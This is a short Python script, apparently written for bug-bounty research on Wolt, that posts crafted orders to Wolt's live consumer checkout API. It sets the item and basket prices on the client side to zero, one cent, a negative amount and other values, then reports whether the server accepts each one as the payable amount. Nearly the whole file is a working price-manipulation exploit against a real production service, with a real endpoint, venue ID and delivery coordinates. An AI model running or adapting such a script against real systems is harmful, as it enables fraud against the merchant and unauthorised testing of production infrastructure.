"""Direct checkout price manipulation test - minimal viable approach."""
import requests, json

H = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Origin': 'https://wolt.com',
    'X-HackerOne-Research': 'pccp',
    'Content-Type': 'application/json',
}

VENUE_ID = '60ebeb71c6904c2caf035f71'
VENUE_SLUG = 'wolt-market-kamppi'

# Generate a plausible item ID (Wolt uses MongoDB-like 24-char hex or alphanumeric)
# Let's just try with the venue campaign ID prefix
FAKE_ITEM_ID = '670fa3e9ead6e49d65cc3614'  # This is the test user_id, but format matches
FAKE_ITEM_NAME = 'Test Item'

print("=== CHECKOUT PRICE MANIPULATION TEST ===")
print(f"Venue: {VENUE_ID} | do_use_backend_pricing=no (client-controlled prices)")
print()

test_cases = [
    # (manip_price, description)
    (1, "Price=1 cent"),
    (0, "Price=0 (free)"),
    (306, "Normal price"),
    (99999, "Price=999.99 EUR"),
    (-1, "Negative price"),
    (0.01, "Price=0.01"),
]

for price, desc in test_cases:
    item_obj = {
        'id': FAKE_ITEM_ID,
        'name': FAKE_ITEM_NAME,
        'count': 1,
        'price': price,
        'base_price': price,
        'end_amount': price,
        'options': [],
        'restrictions': [],
        'category_id': '',
        'exclude_from_discounts': False,
    }
    body = {
        'items': [item_obj],
        'base_price': price,
        'end_amount': price,
        'supplier_id': VENUE_ID,
        'selected_delivery_method': 'homedelivery',
        'delivery_location': {'lat': 60.168142, 'lon': 24.939986},
        'currency': 'EUR',
        'vendor': 'wolt',
        'discount': 0,
        'basket_id': f'test-manip-{price}',
        'pickup': False,
        'scheduled_time': None,
        'shipping_method': 'homedelivery',
        'discount_code': None,
        'purchase_plan': {
            'venue': {
                'id': VENUE_ID,
                'country': 'FIN',
                'currency': 'EUR'
            },
            'delivery_method': 'homedelivery',
            'menu_items': [item_obj]
        }
    }

    r = requests.post('https://consumer-api.wolt.com/order-xp/web/v2/pages/checkout',
                      headers=H, json=body)
    
    if r.status_code == 200:
        d = r.json()
        pa = d.get('payable_amount', 'N/A')
        keys = list(d.keys())
        match = '*** MATCH ***' if isinstance(pa, (int, float)) and abs(pa - price) < 2 else ''
        print(f"[{desc:20s}] 200 | payable={pa} | keys={keys[:8]} {match}")
    elif r.status_code == 400:
        err = r.json() if 'json' in r.headers.get('content-type', '') else r.text[:200]
        print(f"[{desc:20s}] 400 | {str(err)[:200]}")
    else:
        print(f"[{desc:20s}] {r.status_code} | {r.text[:150]}")

print("\nDONE")
